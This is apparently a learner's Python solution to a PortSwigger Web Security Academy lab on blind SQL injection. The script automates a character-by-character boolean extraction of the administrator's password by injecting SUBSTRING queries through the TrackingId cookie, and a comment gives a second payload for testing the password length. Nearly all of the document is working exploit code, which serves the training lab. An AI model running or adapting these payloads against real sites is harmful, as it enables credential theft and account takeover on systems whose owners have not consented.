'''
**Lab: Blind SQL injection with conditional responses**
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.
Link :https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses 

'''


import requests 
import string
url = "https://0af3007304987019c0bd226b003100c5.web-security-academy.net/login" # to change 
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"} # for debugging 
p = string.printable
c = {"csrf":"swWy1pRVJ9ubiCP4y3H8fqB4CtyYNhrL", 'username':'test','password':'test'} # csrf token should not be removed 
flag = ""
print("Administrator Password = ",end='')
for l in range(1,21): # length checked using the following query : xM05IfpBKHKgWDoP' AND LENGTH((SELECT password FROM Users WHERE Username = 'administrator')) > '20
    for i in p:
        h = {"TrackingId":"xM05IfpBKHKgWDoP' AND SUBSTRING((SELECT password FROM Users WHERE Username = 'administrator'), {l}, 1) like '{s}".format(s=i,l=l), "session":"4yOM0ue3quX5AmCrGOxEqOrOBFaAlDX8"} # session should not be removed 
        r = requests.post(url,data=c,cookies=h)

        if"Welcome back" in r.text: 
            flag =flag + i
            #print(i)
            break
    
print(flag)